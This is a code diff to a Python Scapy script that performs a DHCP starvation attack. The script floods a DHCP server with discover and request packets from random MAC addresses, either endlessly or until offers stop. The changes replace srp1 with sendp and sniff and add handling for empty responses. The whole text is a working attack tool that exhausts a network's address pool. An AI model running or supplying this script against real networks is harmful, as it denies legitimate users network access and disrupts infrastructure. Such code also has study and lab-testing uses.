@@ -28,8 +28,9 @@ def dhcp_discover(src_mac, target, iface):
     dhcp = DHCP(options=[("message-type", "discover"), "end"]) # DHCP layer
 
     packet = ether / ip / udp / bootp / dhcp
-    offer = srp1(packet, iface=iface, timeout=2)
-    print("DHCP discover sent")
+    print("Sending DHCP discover")
+    sendp(packet, iface=iface, verbose=0)
+    offer = sniff(filter="udp port 68", timeout=3, count=1)
     return offer
 
 # Send a DHCP request packet
@@ -63,9 +64,7 @@ def dhcp_request(offer, iface):
     dhcp_request = ether / ip / udp / bootp / dhcp
 
     print("Sending DHCP request")
-    ack = srp1(dhcp_request, iface = iface)
-    if ack:
-        print("DHCP ack received")
+    sendp(dhcp_request, iface = iface)
 
 
 def starve(target, iface, persistent):
@@ -73,7 +72,9 @@ def starve(target, iface, persistent):
         while True:
             src_mac = RandMAC()
             dhcp_offer = dhcp_discover(src_mac = src_mac, target = target, iface = iface)
-            dhcp_request(offer=dhcp_offer, iface = iface)
+            if not dhcp_offer:
+                continue
+            dhcp_request(offer=dhcp_offer[0], iface = iface)
             time.sleep(1)
 
     else: # If we don't want the attack to be persistant we check if we get DHCP offers, if not we can stop the attack
@@ -82,14 +83,14 @@ def starve(target, iface, persistent):
             while True:
                 src_mac = RandMAC()
                 dhcp_offer = dhcp_discover(src_mac = src_mac, target = target ,iface = iface) # Send a DHCP discover
-                if dhcp_offer is None: # If we didn't get a DHCP offer, we try 3 more times
+                if not dhcp_offer: # If we didn't get a DHCP offer, we try 3 more times
                     if counter >= 3: # If we still don't get a DHCP offer, we stop the attack
                         print("finishing attack")
                         return
                     counter += 1
                     print("retrying")
                     continue
-                dhcp_request(offer = dhcp_offer, iface = iface)
+                dhcp_request(offer = dhcp_offer[0], iface = iface)
 
 
 # Calling the starve function
